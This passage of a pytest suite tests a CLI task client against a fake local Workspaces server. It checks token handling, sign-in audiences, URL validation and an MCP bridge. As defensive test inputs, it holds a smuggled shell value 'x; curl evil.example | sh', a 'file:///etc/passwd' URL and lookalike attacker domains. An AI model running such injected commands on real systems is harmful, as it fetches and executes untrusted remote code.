"""``lc task ... --server URL`` against a fake Workspaces server on 127.0.0.1 that speaks the M4 HTTP contract."""

from __future__ import annotations

import errno
import http.client
import io
import json
import os
import socket
import ssl
import stat
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from collections.abc import Callable, Iterator, Sequence
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

import lemoncrow_client
import pytest
from lemoncrow_client import host_install, task_server
from lemoncrow_client.task import task_main
from lemoncrow_client.task_server import ServerError, WorkspacesClient, bridge, load_record, record_path, server_url

ORG_TOKEN = "org-secret-0123456789abcdef"


@dataclass
class FakeState:
    base: str = ""
    tasks: dict[str, dict[str, Any]] = field(default_factory=dict)
    tokens: dict[str, str] = field(default_factory=dict)
    #: (method, path, Authorization header, JSON body or None)
    requests: list[tuple[str, str, str, Any]] = field(default_factory=list)
    mcp_url: str | None = None
    redirect_to: str | None = None
    #: ``slow`` calls wait here for each other, so they pass only when the bridge posts them at once.
    barrier: threading.Barrier | None = None
    #: Set by ``notifications/cancelled``; ``wait_cancel`` waits for it.
    cancelled: threading.Event = field(default_factory=threading.Event)
    lock: threading.Lock = field(default_factory=threading.Lock)
    inflight: int = 0
    peak: int = 0
    #: ("arrive" or "leave", request id) for MCP requests, in order.
    events: list[tuple[str, Any]] = field(default_factory=list)
    #: Whether a bearer token besides the organization's is a person's own sign-in for this server.
    person: Callable[[str], bool] | None = None
    #: When set, ``POST /v1/tasks`` answers with this status and error reply instead of starting a task.
    refusal: tuple[int, dict[str, Any]] | None = None


def _handler(state: FakeState) -> type[BaseHTTPRequestHandler]:
    class Handler(BaseHTTPRequestHandler):
        def log_message(self, format: str, *args: object) -> None:
            pass

        def _reply(self, status: int, body: object = None, *, pretty: bool = False) -> None:
            data = b"" if body is None else json.dumps(body, indent=2 if pretty else None).encode()
            self.send_response(status)
            if body is not None:
                self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def _body(self) -> Any:
            length = int(self.headers.get("Content-Length") or 0)
            raw = self.rfile.read(length) if length else b""
            return json.loads(raw) if raw else None

        def do_GET(self) -> None:
            self._serve("GET")

        def do_POST(self) -> None:
            self._serve("POST")

        def _serve(self, method: str) -> None:
            body = self._body()
            auth = self.headers.get("Authorization") or ""
            state.requests.append((method, self.path, auth, body))
            if state.redirect_to is not None and self.path.startswith("/moved"):
                self.send_response(302)
                self.send_header("Location", state.redirect_to + self.path.removeprefix("/moved"))
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            parts = self.path.strip("/").split("/")
            org = auth == f"Bearer {ORG_TOKEN}" or (
                state.person is not None and state.person(auth.removeprefix("Bearer "))
            )
            if parts[:2] != ["v1", "tasks"]:
                return self._reply(404, {"error": "no such endpoint"})
            if len(parts) == 2:
                if not org:
                    return self._reply(401, {"error": "organization token required"})
                if method == "GET":
                    return self._reply(200, {"tasks": list(state.tasks.values())})
                if state.refusal is not None:
                    return self._reply(*state.refusal)
                task_id = body["id"]
                if task_id in state.tasks:
                    return self._reply(409, {"error": f"task {task_id} exists"})
                repos = body.get("repos", ["app"])
                task = {
                    "id": task_id,
                    "state": "running",
                    "repos": [
                        {"name": n, "branch": f"agent/{task_id}", "base": body.get("base", "main"), "head": "a" * 40}
                        for n in repos
                    ],
                    # As the server sends them: seconds since the epoch (2026-11-08 10:00:00 UTC).
                    "created_at": 1794132000.25,
                    "last_used_at": 1794132000.25,
                }
                state.tasks[task_id] = task
                state.tokens[task_id] = f"task-secret-{task_id}-fedcba9876543210"
                mcp_url = state.mcp_url or f"{state.base}/v1/tasks/{task_id}/mcp"
                return self._reply(201, {"task": task, "token": state.tokens[task_id], "mcp_url": mcp_url})
            task_id = parts[2]
            if task_id not in state.tasks:
                return self._reply(404, {"error": f"no task {task_id}"})
            own = auth == f"Bearer {state.tokens[task_id]}"
            action = parts[3] if len(parts) > 3 else ""
            if action == "mcp":
                if not own:
                    return self._reply(401, {"error": "task token required"})
                if isinstance(body, list):
                    return self._reply(500, {"error": "batches are not served here"})
                method = body.get("method")
                if method == "notifications/cancelled":
                    state.cancelled.set()
                if "id" not in body:
                    return self._reply(500 if method == "boom" else 202)
                if method == "boom":
                    return self._reply(500, {"error": "tool exploded"})
                with state.lock:
                    state.inflight += 1
                    state.peak = max(state.peak, state.inflight)
                    state.events.append(("arrive", body["id"]))
                echo: dict[str, Any] = {"echo": method}
                try:
                    if method == "slow":
                        if state.barrier is not None:
                            state.barrier.wait()
                        time.sleep(body["params"]["delay"])
                        echo["params"] = body["params"]
                    if method == "wait_cancel":
                        echo["cancelled"] = state.cancelled.wait(10)
                finally:
                    with state.lock:
                        state.inflight -= 1
                        state.events.append(("leave", body["id"]))
                result = {"jsonrpc": "2.0", "id": body["id"], "result": echo}
                return self._reply(200, result, pretty=True)
            if not (org or own):
                return self._reply(401, {"error": "token required"})
            if action == "":
                return self._reply(200, {"task": state.tasks[task_id]})
            if action == "verify":
                checks = [{"id": "unit", "status": "passed", "seconds": 1.25}]
                repo = {"repo": "app", "passed": True, "checks": checks, "saved_ref": "refs/x", "commit": "b" * 40}
                return self._reply(200, {"passed": True, "repos": [repo]})
            if action == "land":
                if body["message"] == "refuse":
                    return self._reply(200, {"landed": False, "pushed": [], "reason": "checks failed"})
                if body["message"] == "review":
                    findings = [
                        {"severity": "p0", "source": "check", "title": "check unit failed", "path": "", "line": 0},
                        *(
                            {"severity": "p1", "title": f"finding {n}", "path": "src/a.py", "line": n + 1}
                            for n in range(21)
                        ),
                    ]
                    review = {"repo": "app", "verdict": "fail", "reason": "fails on 1 P0", "findings": findings}
                    reason = "app: Review did not pass it: fails on 1 P0"
                    return self._reply(200, {"landed": False, "pushed": [], "reason": reason, "reviews": [review]})
                return self._reply(200, {"landed": True, "pushed": [{"repo": "app", "commit": "c" * 40}]})
            if action == "finish":
                state.tasks[task_id]["state"] = "finished"
                saved = [{"repo": "app", "ref": f"refs/lemoncrow/saved/{task_id}", "commit": "d" * 40}]
                return self._reply(200, {"finished": True, "saved": saved})
            if action == "discard":
                return self._reply(200, {"discarded": [{"repo": "app", "ref": f"refs/lemoncrow/saved/{task_id}"}]})
            if action == "previews":
                return self._reply(200, {"url": f"{state.base}/p/one-time-{parts[4]}"})
            return self._reply(404, {"error": "no such action"})

    return Handler


@pytest.fixture
def fake() -> Iterator[FakeState]:
    state = FakeState()
    server = ThreadingHTTPServer(("127.0.0.1", 0), _handler(state))
    state.base = f"http://127.0.0.1:{server.server_address[1]}"
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield state
    finally:
        server.shutdown()
        server.server_close()
        thread.join()


@pytest.fixture(autouse=True)
def _isolated(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("LEMONCROW_HOME", str(tmp_path / "home"))
    monkeypatch.setenv(task_server.TOKEN_ENV, ORG_TOKEN)
    monkeypatch.delenv(task_server.SERVER_ENV, raising=False)
    for name in ("http_proxy", "HTTP_PROXY", "https_proxy", "HTTPS_PROXY", "all_proxy", "ALL_PROXY"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("NO_PROXY", "*")


def run(*arguments: str) -> tuple[int, str]:
    sink = io.StringIO()
    code = task_main(list(arguments), sink)
    return code, sink.getvalue()


def start(fake: FakeState, task_id: str = "t1", *extra: str) -> tuple[int, str]:
    return run("start", task_id, "--server", fake.base, *extra)


def test_start_keeps_the_task_token_in_an_owner_only_file_and_never_prints_it(fake: FakeState, tmp_path: Path) -> None:
    code, output = start(fake, "t1", "--repos", "app,lib", "--base", "main")

    assert code == 0, output
    token = fake.tokens["t1"]
    assert token not in output and ORG_TOKEN not in output
    port = fake.base.rsplit(":", 1)[1]
    path = tmp_path / "home" / "workspaces" / "tasks" / f"127.0.0.1_{port}" / "t1.json"
    assert path == record_path(fake.base, "t1")
    assert stat.S_IMODE(path.stat().st_mode) == 0o600
    for directory in (path.parent, path.parent.parent, path.parent.parent.parent):
        assert stat.S_IMODE(directory.stat().st_mode) == 0o700
    saved = json.loads(path.read_text())
    assert saved == {"server": fake.base, "id": "t1", "token": token, "mcp_url": f"{fake.base}/v1/tasks/t1/mcp"}
    assert [p.name for p in path.parent.iterdir()] == ["t1.json"]  # no temporary left behind
    method, request_path, auth, body = fake.requests[0]
    assert (method, request_path, auth) == ("POST", "/v1/tasks", f"Bearer {ORG_TOKEN}")
    assert body == {"id": "t1", "repos": ["app", "lib"], "base": "main"}
    assert f"MCP endpoint {fake.base}/v1/tasks/t1/mcp" in output
    assert f"lc task mcp t1 --server {fake.base}" in output
    assert "app: agent/t1 from main" in output


_EXAMPLE = "IMAGE: the image the checks run in, such as python:3.12-slim"


@pytest.mark.parametrize(
    ("refusal", "fix"),
    [
        (
            {
                "error": "a server task needs a [toolchain] image in .lemoncrow/environment.toml",
                "code": "toolchain_missing",
            },
            f"lc verify init --toolchain IMAGE  ({_EXAMPLE})",
        ),
        (
            {"error": "the toolchain python:3.12 is not pinned", "code": "toolchain_unpinned", "image": "python:3.12"},
            "lc verify init --toolchain python:3.12  (it pins the image to the digest its registry serves)",
        ),
        # Only a well-formed image name goes into the command; anything else stays a placeholder.
        (
            {
                "error": "the toolchain is not pinned",
                "code": "toolchain_unpinned",
                "image": "x; curl evil.example | sh",
            },
            f"lc verify init --toolchain IMAGE  ({_EXAMPLE})",
        ),
        (
            {
                "error": "this server cannot pull the toolchain ghcr.io/acme/ci@sha256:...: pull failed: denied",
                "code": "toolchain_unavailable",
                "image": "ghcr.io/acme/ci@sha256:" + "0" * 64,
            },
            "lc verify init --toolchain IMAGE  (IMAGE: one this server can pull, such as a public image)",
        ),
    ],
)
def test_a_start_refused_for_the_toolchain_names_the_command_that_fixes_it(
    fake: FakeState, refusal: dict[str, Any], fix: str
) -> None:
    fake.refusal = (422, refusal)

    code, output = start(fake)

    assert code == 1
    assert output.splitlines() == [
        f"lc task: Workspaces server: {refusal['error']} (HTTP 422)",
        f"lc task: fix it in the repository with: {fix}",
        "lc task: then commit .lemoncrow/environment.toml, push it, and start the task again",
    ]
    assert load_record(fake.base, "t1") is None


def test_any_other_refused_start_names_no_toolchain_fix(fake: FakeState) -> None:
    fake.refusal = (409, {"error": "task t1 already exists", "code": "somethingelse"})
    code, output = start(fake)
    assert (code, output) == (1, "lc task: Workspaces server: task t1 already exists (HTTP 409)\n")


@pytest.mark.parametrize("verb", sorted(task_server.SERVER_ONLY))
def test_a_server_only_verb_used_locally_says_it_needs_a_server(
    verb: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    code, output = run(verb, "t1")
    assert code == 2
    assert output == (
        f"lc task: {verb} is for tasks on a Workspaces server: add --server URL or set {task_server.SERVER_ENV}\n"
    )


def test_the_local_verbs_are_the_server_verbs_and_every_other_server_verb_is_named_server_only() -> None:
    from lemoncrow_client import task

    local, served = set(task._ACTIONS), {*task_server._COMMANDS, "mcp"}
    assert local == {"start", "land", "finish", "list"} and local <= served
    assert served - local == task_server.SERVER_ONLY


def test_the_organization_token_comes_only_from_the_environment(
    fake: FakeState, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.delenv(task_server.TOKEN_ENV)
    code, output = start(fake)
    assert code == 1 and task_server.TOKEN_ENV in output
    assert fake.requests == []
    code, output = start(fake, "t1", "--token", ORG_TOKEN)
    assert code == 2 and "unknown argument: --token" in output and ORG_TOKEN not in output
    monkeypatch.setenv(task_server.TOKEN_ENV, f"  {ORG_TOKEN}\n")
    assert start(fake)[0] == 0
    assert fake.requests[-1][2] == f"Bearer {ORG_TOKEN}"


ISSUER = "https://auth.example.test/api/realms/lemoncrow/auth"
USERINFO = f"{ISSUER}/oauth2/userinfo"
API = "https://api.lemoncrow.com"


def _jwt(expires: float, audience: object = API) -> str:
    import base64

    payload = {"exp": expires, "iss": ISSUER, "sub": "person-0001", "aud": audience}
    claims = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    return f"eyJhbGciOiJFZERTQSJ9.{claims}.c2lnbmF0dXJl"


def _sign_in(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, servers: dict[str, str]) -> str:
    """A sign-in naming the API and *servers* (origin -> its held token); returns the API's access token."""

    from lemoncrow_client.credentials import ManagedSignIn, _write_sign_in

    monkeypatch.delenv(task_server.TOKEN_ENV)
    monkeypatch.setenv("LEMONCROW_URL", "https://api.lemoncrow.test")
    api_access = _jwt(time.time() + 3600, [API, USERINFO])
    _write_sign_in(tmp_path / "home" / "account", ManagedSignIn(api_access, "refresh-1", servers))
    return api_access


def _no_refresh(monkeypatch: pytest.MonkeyPatch) -> None:
    from lemoncrow_client import credentials

    def refuse(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("Authward must not be asked")

    monkeypatch.setattr(credentials, "discover_authward", refuse)


@pytest.mark.parametrize(
    ("url", "hosted"),
    [
        ("https://acme.workspaces.lemoncrow.com", True),
        ("https://lemoncrow.com", True),
        ("http://acme.lemoncrow.com", False),
        ("https://lemoncrow.com.evil.test", False),
        ("https://evil-lemoncrow.com", False),
        ("https://10.0.0.5:7480", False),
    ],
)
def test_only_lemoncrow_hosted_servers_get_a_persons_sign_in(url: str, hosted: bool) -> None:
    assert task_server._account_server(url) is hosted


def test_a_hosted_server_gets_the_persons_own_sign_in_for_its_origin(
    fake: FakeState, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    held = _jwt(time.time() + 3600, [fake.base, USERINFO])
    api_access = _sign_in(tmp_path, monkeypatch, {fake.base: held})
    _no_refresh(monkeypatch)
    # Any other server never sees it, and is told to set the organization token.
    code, output = start(fake)
    assert code == 1 and task_server.TOKEN_ENV in output and fake.requests == []
    monkeypatch.setattr(task_server, "_account_server", lambda server: True)
    code, output = start(fake)  # the fake takes only the organization token: what matters is what was sent
    assert code == 1 and held not in output
    assert fake.requests[-1][2] == f"Bearer {held}"
    assert not any(api_access in request[2] for request in fake.requests)


def test_the_api_sign_in_is_never_sent_to_a_workspaces_server_it_does_not_cover(
    fake: FakeState, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    api_access = _sign_in(tmp_path, monkeypatch, {"https://other.workspaces.lemoncrow.com": ""})
    _no_refresh(monkeypatch)
    monkeypatch.setattr(task_server, "_account_server", lambda server: True)
    code, output = start(fake)
    assert code == 1 and fake.requests == [] and api_access not in output
    assert f"does not cover the Workspaces server {fake.base}; run `lc auth login --server {fake.base}`" in output


@pytest.mark.parametrize(
    "audience",
    [
        API,
        [API, USERINFO],
        "https://other.workspaces.lemoncrow.com",
        ["ORIGIN", "https://other.workspaces.lemoncrow.com"],
        ["ORIGIN", API],
        None,
    ],
)
def test_a_token_issued_for_another_resource_is_never_sent(
    fake: FakeState, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, audience: object
) -> None:
    if isinstance(audience, list):
        audience = [fake.base if entry == "ORIGIN" else entry for entry in audience]
    held = _jwt(time.time() + 3600, audience)
    _sign_in(tmp_path, monkeypatch, {fake.base: held})
    _no_refresh(monkeypatch)
    monkeypatch.setattr(task_server, "_account_server", lambda server: True)
    code, output = start(fake)
    assert code == 1 and fake.requests == [] and held not in output
    assert f"refusing to send {fake.base} a sign-in issued for another resource" in output


def test_one_sign_in_serves_the_api_and_the_workspaces_server_each_with_its_own_token(
    fake: FakeState, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from _fake_authward import API as AUTHWARD_API
    from _fake_authward import serve_authward
    from lemoncrow_client import auth_cli
    from lemoncrow_client.cli import main as cli_main
    from lemoncrow_client.credentials import read_managed_sign_in, refresh_managed_access, token_claims

    monkeypatch.delenv(task_server.TOKEN_ENV)
    monkeypatch.setattr(task_server, "_account_server", lambda server: True)
    monkeypatch.setattr(auth_cli.time, "sleep", lambda _seconds: None)
    monkeypatch.setattr(auth_cli, "launch_browser_url", lambda _url: True)
    # The fake Workspaces server takes a token whose audience holds its own origin, as the real one does.
    fake.person = lambda token: fake.base in (token_claims(token).get("aud") or [])
    state_dir = tmp_path / "home" / "account"
    with serve_authward() as authward:
        authward.registered.add(fake.base)
        monkeypatch.setenv("LEMONCROW_URL", authward.base)
        monkeypatch.setenv("LEMONCROW_INSTALL_MODE", "hosted")

        sink = io.StringIO()
        assert cli_main(["auth", "login", "--no-browser", "--server", f"{fake.base}/"], stdout=sink) == 0
        assert f"Signed in to the Workspaces server {fake.base}\n" in sink.getvalue()
        # One sign-in names both resources; its first token request names one, the API.
        assert authward.requests == [("/device/code", [AUTHWARD_API, fake.base]), ("/oauth2/token", [AUTHWARD_API])]
        signed_in = read_managed_sign_in(state_dir)
        assert signed_in is not None and signed_in.servers == {fake.base: ""}
        api_access = signed_in.access_token

        # The server's own token is asked for on first use, for its origin alone, and sent; the API's never is.
        code, output = start(fake)
        assert code == 0, output
        ((resource, server_access),) = authward.issued[1:]
        assert resource == fake.base and authward.requests[-1] == ("/oauth2/token", [fake.base])
        assert fake.requests[-1][2] == f"Bearer {server_access}" and server_access not in output
        assert not any(api_access in request[2] for request in fake.requests)

        # A second command reuses it: Authward is not asked again.
        assert start(fake, "t2")[0] == 0
        assert len(authward.requests) == 3 and fake.requests[-1][2] == f"Bearer {server_access}"

        # The API's token is refreshed with the newest refresh token, for the API alone; the server's token stays.
        fresh = refresh_managed_access(authward.base, state_dir=state_dir, stale_access=api_access, timeout_s=5)
        assert authward.requests[-1] == ("/oauth2/token", [AUTHWARD_API])
        assert len(authward.refreshes) == len(set(authward.refreshes)) == 2 and not authward.ended
        after = read_managed_sign_in(state_dir)
        assert after is not None and after.access_token == fresh and after.servers == {fake.base: server_access}
        assert after.refresh_token == next(iter(authward.newest.values()))

    api_claims, server_claims = token_claims(fresh), token_claims(server_access)
    assert api_claims["aud"][0] == AUTHWARD_API and server_claims["aud"][0] == fake.base
    assert api_claims["sub"] == server_claims["sub"]


def test_a_hosted_server_without_a_sign_in_says_how_to_sign_in(
    fake: FakeState, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.delenv(task_server.TOKEN_ENV)
    monkeypatch.setattr(task_server, "_account_server", lambda server: True)
    code, output = start(fake)
    assert code == 1 and f"lc auth login --server {fake.base}" in output and fake.requests == []


def test_the_server_from_the_environment_serves_the_tasks_started_there(
    fake: FakeState, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv(task_server.SERVER_ENV, fake.base)
    assert start(fake)[0] == 0  # a task lives on a server only by --server
    token = f"Bearer {fake.tokens['t1']}"

    code, output = run("verify", "t1")
    assert code == 0 and "passed its checks on the Workspaces server" in output
    code, output = run("land", "t1", "-m", "Fix")
    assert code == 0 and "app: pushed cccccccccccc" in output
    code, output = run("finish", "t1")
    assert code == 0 and "finished t1 on the Workspaces server" in output
    assert [entry[1:3] for entry in fake.requests[1:]] == [
        ("/v1/tasks/t1/verify", token),
        ("/v1/tasks/t1/land", token),
        ("/v1/tasks/t1/finish", token),
    ]
    # Its token file is gone with it; a verb only a server has still goes there, with the organization token.
    code, output = run("discard", "t1")
    assert code == 0 and "discarded refs/lemoncrow/saved/t1" in output
    assert fake.requests[-1][1:3] == ("/v1/tasks/t1/discard", f"Bearer {ORG_TOKEN}")


def _local_repo(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    config = tmp_path / "gitconfig"
    config.write_text("[user]\n\tname = Tester\n\temail = t@example.com\n[init]\n\tdefaultBranch = main\n")
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(config))
    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
    repo, origin = tmp_path / "repo", tmp_path / "origin.git"
    subprocess.run(["git", "init", "-q", "--bare", str(origin)], check=True)
    repo.mkdir()
    for args in (
        ["init", "-q"],
        ["commit", "-q", "--allow-empty", "-m", "init"],
        ["remote", "add", "origin", str(origin)],
    ):
        subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)
    subprocess.run(["git", "push", "-q", "origin", "main"], cwd=repo, check=True, capture_output=True)
    monkeypatch.chdir(repo)
    return repo


def test_a_local_task_stays_local_with_the_server_in_the_environment(
    fake: FakeState, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = _local_repo(tmp_path, monkeypatch)
    monkeypatch.setenv(task_server.SERVER_ENV, fake.base)

    code, output = run("start", "local1")
    assert code == 0, output
    assert (repo / ".worktrees" / "local1").is_dir()
    code, output = run("list")
    assert code == 0 and "agent/local1" in output and "landed" in output
    code, output = run("finish", "local1")
    assert code == 0, output
    assert not (repo / ".worktrees" / "local1").exists()
    assert fake.requests == []


@pytest.mark.parametrize(
    "url",
    [
        "ftp://127.0.0.1/",
        "file:///etc/passwd",
        "http://user:pw@127.0.0.1:8080",
        "http://user@127.0.0.1",
        "http://127.0.0.1/?token=x",
        "http://127.0.0.1/#x",
        "http://",
        "http://127.0.0.1:99999",
        "http://127.0.0.1/a b",
        "127.0.0.1:8080",
    ],
)
def test_server_urls_other_than_plain_http_or_https_are_refused(url: str) -> None:
    with pytest.raises(ServerError) as refused:
        server_url(url)
    assert refused.value.code == 2
    code, output = run("list", "--server", url)
    assert code == 2 and "lc task:" in output


def test_server_url_is_normalized() -> None:
    assert server_url(" https://ws.internal:8443/base/ ") == "https://ws.internal:8443/base"
    assert server_url("http://[::1]:9000") == "http://[::1]:9000"


def _stdin(monkeypatch: pytest.MonkeyPatch, lines: Sequence[bytes]) -> None:
    monkeypatch.setattr(sys, "stdin", io.TextIOWrapper(io.BytesIO(b"".join(line + b"\n" for line in lines))))


def test_the_bridge_round_trips_requests_and_stays_silent_on_notifications(
    fake: FakeState, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    assert start(fake)[0] == 0
    _stdin(
        monkeypatch,
        [
            b'{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}',
            b'{"jsonrpc":"2.0","method":"notifications/initialized"}',
            b"",
            b'{"jsonrpc":"2.0","id":"abc","method":"tools/list"}',
        ],
    )
    code, output = run("mcp", "t1", "--server", fake.base)

    assert code == 0
    lines = output.splitlines()
    assert [json.loads(line) for line in lines] == [
        {"jsonrpc": "2.0", "id": 1, "result": {"echo": "initialize"}},
        {"jsonrpc": "2.0", "id": "abc", "result": {"echo": "tools/list"}},
    ]
    mcp = [entry for entry in fake.requests if entry[1] == "/v1/tasks/t1/mcp"]
    assert len(mcp) == 3
    assert {entry[2] for entry in mcp} == {f"Bearer {fake.tokens['t1']}"}
    assert mcp[1][3] == {"jsonrpc": "2.0", "method": "notifications/initialized"}
    assert capsys.readouterr().err == ""


def test_http_failures_become_jsonrpc_errors_with_the_request_id(fake: FakeState) -> None:
    assert start(fake)[0] == 0
    record = load_record(fake.base, "t1")
    assert record is not None
    source = io.BytesIO(
        b'{"jsonrpc":"2.0","id":7,"method":"boom"}\n'
        b'{"jsonrpc":"2.0","method":"boom"}\n'
        b"not json\n"
        b'[{"jsonrpc":"2.0","id":8,"method":"boom"},{"jsonrpc":"2.0","method":"boom"}]\n'
    )
    sink, log = io.StringIO(), io.StringIO()
    assert bridge(source, sink, client=WorkspacesClient(fake.base), record=record, log=log) == 0

    replies = [json.loads(line) for line in sink.getvalue().splitlines()]  # in the order they were answered
    assert len(replies) == 3
    batch = next(reply for reply in replies if isinstance(reply, list))
    first, parse = sorted((reply for reply in replies if isinstance(reply, dict)), key=lambda r: r["id"] is None)
    assert first["id"] == 7 and first["error"]["code"] == -32000
    assert "tool exploded" in first["error"]["message"] and "HTTP 500" in first["error"]["message"]
    assert parse == {"jsonrpc": "2.0", "id": None, "error": {"code": -32700, "message": parse["error"]["message"]}}
    assert [item["id"] for item in batch] == [8]
    assert "HTTP 500" in log.getvalue()  # the failed notification is reported off stdout
    assert record.token not in sink.getvalue() + log.getvalue()


def test_an_unreachable_server_answers_each_request_with_an_error(fake: FakeState) -> None:
    assert start(fake)[0] == 0
    record = load_record(fake.base, "t1")
    assert record is not None
    with socket.socket() as probe:
        probe.bind(("127.0.0.1", 0))
        port = probe.getsockname()[1]
    gone = task_server.TaskRecord(record.server, "t1", record.token, f"http://127.0.0.1:{port}/v1/tasks/t1/mcp")
    sink = io.StringIO()
    source = io.BytesIO(b'{"jsonrpc":"2.0","id":3,"method":"tools/list"}\n')
    bridge(source, sink, client=WorkspacesClient(fake.base), record=gone, log=io.StringIO())
    reply = json.loads(sink.getvalue())
    assert reply["id"] == 3 and "cannot reach the Workspaces server" in reply["error"]["message"]


API_TOKEN = "api-secret-0123456789abcdef"


@dataclass
class FakeApi:
    """The LemonCrow API's wake route: records each wake and answers as the hosted server does."""

    base: str = ""
    #: (path, Authorization header, JSON body)
    wakes: list[tuple[str, str, Any]] = field(default_factory=list)
    status: int = 200
    on_wake: Callable[[], None] = lambda: None


@pytest.fixture
def api() -> Iterator[FakeApi]:
    state = FakeApi()

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, format: str, *args: object) -> None:
            pass

        def do_POST(self) -> None:
            raw = self.rfile.read(int(self.headers.get("Content-Length") or 0))
            state.wakes.append((self.path, self.headers.get("Authorization") or "", json.loads(raw)))
            state.on_wake()
            if state.status == 200:
                body: dict[str, Any] = {"server": state.wakes[-1][2]["server"], "ready": True, "started": True}
            else:
                body = {"error": {"code": "forbidden", "message": "you may not wake this Workspaces server"}}
            data = json.dumps(body).encode()
            self.send_response(state.status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    state.base = f"http://127.0.0.1:{server.server_address[1]}"
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield state
    finally:
        server.shutdown()
        server.server_close()
        thread.join()


def _stopped(monkeypatch: pytest.MonkeyPatch, fake: FakeState) -> dict[str, int]:
    """*fake* refuses connections while ``down``; ``refused`` counts them. Other URLs connect as usual."""

    seen = {"down": 1, "refused": 0}
    real = urllib.request.OpenerDirector.open

    def refuse(self: urllib.request.OpenerDirector, request: Any, *args: Any, **kwargs: Any) -> Any:
        url = request.full_url if isinstance(request, urllib.request.Request) else request
        if url.startswith(fake.base) and seen["down"]:
            seen["refused"] += 1
            raise urllib.error.URLError(ConnectionRefusedError(61, "Connection refused"))
        return real(self, request, *args, **kwargs)

    monkeypatch.setattr(urllib.request.OpenerDirector, "open", refuse)
    return seen


def _hosted(monkeypatch: pytest.MonkeyPatch, api: FakeApi, token: str = API_TOKEN) -> None:
    monkeypatch.setattr(task_server, "_account_server", lambda server: True)
    monkeypatch.setattr(task_server, "_api_sign_in", lambda: (api.base, token))


def test_a_stopped_hosted_server_is_woken_once_and_the_request_tried_again(
    fake: FakeState, api: FakeApi, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    _hosted(monkeypatch, api)
    seen = _stopped(monkeypatch, fake)
    api.on_wake = lambda: seen.update(down=0)

    code, output = start(fake)

    assert code == 0, output
    assert seen["refused"] == 1
    # The wake goes to the LemonCrow API with the person's API sign-in, naming the server by the URL connected to.
    assert api.wakes == [("/v1/workspaces/wake", f"Bearer {API_TOKEN}", {"server": fake.base})]
    assert [request[:3] for request in fake.requests] == [("POST", "/v1/tasks", f"Bearer {ORG_TOKEN}")]
    assert "asking LemonCrow to start it" in capsys.readouterr().err
    assert API_TOKEN not in output


def test_a_server_still_down_after_the_wake_is_reported_and_woken_only_once(
    fake: FakeState, api: FakeApi, monkeypatch: pytest.MonkeyPatch
) -> None:
    _hosted(monkeypatch, api)
    seen = _stopped(monkeypatch, fake)
    client = WorkspacesClient(fake.base)

    for _ in range(2):
        with pytest.raises(ServerError, match="cannot reach the Workspaces server"):
            client.call("GET", "/v1/tasks", ORG_TOKEN)

    assert len(api.wakes) == 1 and seen["refused"] == 4  # each call is tried again once, never more
    assert fake.requests == []


def test_a_server_not_on_lemoncrow_com_is_never_woken(
    fake: FakeState, api: FakeApi, monkeypatch: pytest.MonkeyPatch
) -> None:
    def wake(*_args: Any) -> Any:
        raise AssertionError("only a LemonCrow-hosted server is woken")

    monkeypatch.setattr(task_server, "_api_sign_in", wake)
    monkeypatch.setattr(task_server, "_wake_hosted_server", wake)
    seen = _stopped(monkeypatch, fake)

    code, output = start(fake)

    assert code == 1 and f"cannot reach the Workspaces server at {fake.base}" in output
    assert seen["refused"] == 1 and api.wakes == []
    assert WorkspacesClient("https://lemoncrow.com.evil.test")._wake() is False


def test_a_refused_wake_is_reported_without_the_sign_in(
    fake: FakeState, api: FakeApi, monkeypatch: pytest.MonkeyPatch
) -> None:
    _hosted(monkeypatch, api)
    _stopped(monkeypatch, fake)
    api.status = 403

    code, output = start(fake)

    assert code == 1 and len(api.wakes) == 1
    assert (
        f"cannot reach the Workspaces server at {fake.base}, and LemonCrow did not start it: "
        "you may not wake this Workspaces server (HTTP 403)"
    ) in output
    assert API_TOKEN not in output


def test_without_an_api_sign_in_the_wake_says_how_to_sign_in(
    fake: FakeState, api: FakeApi, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(task_server, "_account_server", lambda server: True)
    _stopped(monkeypatch, fake)

    code, output = start(fake)

    assert code == 1 and "sign in with `lc auth login` so LemonCrow can start it" in output
    assert api.wakes == []


@pytest.mark.parametrize(
    ("exc", "unreachable"),
    [
        (urllib.error.URLError(ConnectionRefusedError(61, "Connection refused")), True),
        (urllib.error.URLError(TimeoutError("timed out")), True),
        (urllib.error.URLError(OSError(errno.EHOSTUNREACH, "No route to host")), True),
        (urllib.error.URLError(OSError(errno.ENETUNREACH, "Network is unreachable")), True),
